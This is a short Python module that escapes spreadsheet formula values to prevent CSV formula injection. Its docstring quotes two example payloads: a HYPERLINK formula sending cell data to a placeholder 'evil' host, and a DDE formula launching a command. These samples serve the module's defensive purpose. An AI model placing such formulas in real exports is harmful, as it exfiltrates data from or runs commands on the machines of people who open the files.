"""CSV / formula-injection safety — the fix for **CSV formula injection**.

A spreadsheet treats a cell as a *formula* when it starts with ``=``, ``+``,
``-``, ``@`` (or a leading tab/CR). If a tool exports attacker-controlled text to
CSV/TSV, opening it in Excel or Google Sheets can execute things like
``=HYPERLINK("http://evil/?"&A1)`` (silent exfiltration) or legacy
``=cmd|'/c calc'!A1`` (process launch).

The fix is to force such values to be text by prefixing a single quote, so the
spreadsheet shows the literal characters instead of evaluating them.
"""

from __future__ import annotations

# Leading characters that make a spreadsheet interpret a cell as a formula.
_DANGEROUS_LEADS = ("=", "+", "-", "@", "\t", "\r")


def is_formula(value: str) -> bool:
    """True if ``value`` would be interpreted as a formula by a spreadsheet."""
    return bool(value) and value[0] in _DANGEROUS_LEADS


def escape_formula(value: str) -> str:
    """Neutralize formula values by prefixing a single quote (forces text)."""
    return "'" + value if is_formula(value) else value
